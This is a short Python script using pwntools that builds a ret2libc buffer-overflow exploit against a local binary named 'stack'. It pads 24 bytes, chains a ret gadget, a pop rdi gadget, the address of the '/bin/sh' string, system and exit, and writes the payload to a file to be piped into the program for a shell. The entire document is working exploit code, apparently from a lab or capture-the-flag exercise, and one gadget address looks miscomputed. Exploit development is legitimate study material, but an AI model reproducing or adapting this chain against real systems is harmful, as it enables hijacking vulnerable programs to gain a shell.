import struct
from pwn import *

# To run exploit 
# python3 exploit.py
# cat exp - | ./stack

libc_base = 0x00007ffff7c00000
padding  = b"A"*24
#ret      = struct.pack("<Q", libc_base+0x40101a)
ret      = p64(libc_base+0x40101a)
#poprdi   = struct.pack("<Q", libc_base+0x28715)    # pop rdi
poprdi   = p64(libc_base+0x28715)
#binsh    = struct.pack("<Q", libc_base+0x1c041b)   # /bin/sh
binsh    = p64(libc_base+0x1c041b)
#system   = struct.pack("<Q", 0x7ffff7c55230)       # absolute system address
system   = p64(0x7ffff7c55230)
#exitfunc = struct.pack("<Q", 0x7ffff7c45240)       # exit function absolute address
exitfunc = p64(0x7ffff7c45240) 

exploit = padding+ret+poprdi+binsh+system+exitfunc

file = open('exp', 'wb')
file.write(exploit)


